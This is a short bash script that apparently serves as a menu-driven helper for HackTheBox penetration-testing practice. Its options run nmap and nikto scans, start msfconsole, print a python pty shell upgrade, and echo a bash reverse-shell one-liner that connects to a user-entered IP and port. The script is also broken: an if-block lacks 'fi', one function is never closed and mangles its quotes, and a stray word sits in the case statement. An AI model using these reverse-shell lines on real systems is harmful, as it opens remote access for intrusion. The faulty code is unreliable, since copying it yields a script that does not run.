#! /bin/bash
ReverseShell(){
	read -p "ip: " ip 
	read -p "port: " port
	echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
}
Nmap(){

       read -p "ip:" ip
       read -p "Box name:" name
       nmap -sC -sV -oA -vvv /root/Desktop/hackthebox/$name/nmap.txt $ip 

}
Nikto(){

	read -p "ip:" ip
	read -p "req type: 1.http 2.https:" req
	read -p "Box name:" name
	if [ $req == 1 ]
	then
		nikto --url http://$ip > /root/Desktop/hackthebox/$name/nikto.txt
	else 
		nikto --url https://$ip > /root/Desktop/hackthebox/$name/nikto.txt	

	
}


Msfconsole(){
		service postgresql start
		service postgresql status
		msfdb init
		msfconsole
}
PythonPty(){
	echo "python -c 'import pty; pty.spawn("/bin/bash")'"

read -p "Here is the list:
	1.Revershell echo scrip
	2.Nmap scan
	3.Nikto scan
	4.Msfconsole
	5.PythonPty
	" Number

case $Number in
	1)
		ReverseShell
		;;
	2)isda
		Nmap
		;;
	3)
		Nikto
		;;
	4)
		Msfconsole
		;;
	5)
		PythonPty
		;;
	
	*)
		echo "you need to select from above list"
		;;
esac
